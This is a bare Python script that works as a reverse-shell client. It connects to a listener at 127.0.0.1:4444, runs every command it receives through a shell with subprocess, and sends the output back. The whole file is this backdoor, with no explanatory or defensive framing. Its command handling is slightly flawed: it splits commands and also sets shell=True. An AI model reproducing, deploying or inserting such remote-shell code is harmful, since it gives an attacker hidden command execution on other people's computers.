import socket 
import platform
import time
import subprocess

HOST = "127.0.0.1" 
PORT = 4444

def main(): 
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    client_socket.connect((HOST, PORT)) 
    message = "Alive"
    while True:
        try:
            data = client_socket.recv(1024)          # Receive data
            if not data:
                print("Server disconnected.")
                break
            instructions = data.decode("utf-8")
            command_output = perform_command(instructions)
            message = command_output
            client_socket.sendall(message.encode())
            time.sleep(5)
        except ConnectionRefusedError:
            print("Connection refused. Server might not be running.")
            break
        except Exception as e:
            print(f"An error occurred: {e}")
            break   

def perform_command(instruction):
    clean_instruct = instruction.split(" ")
    res = subprocess.run(clean_instruct, capture_output=True, text=True, check=True, shell=True)
    return res.stdout + res.stderr


main() 
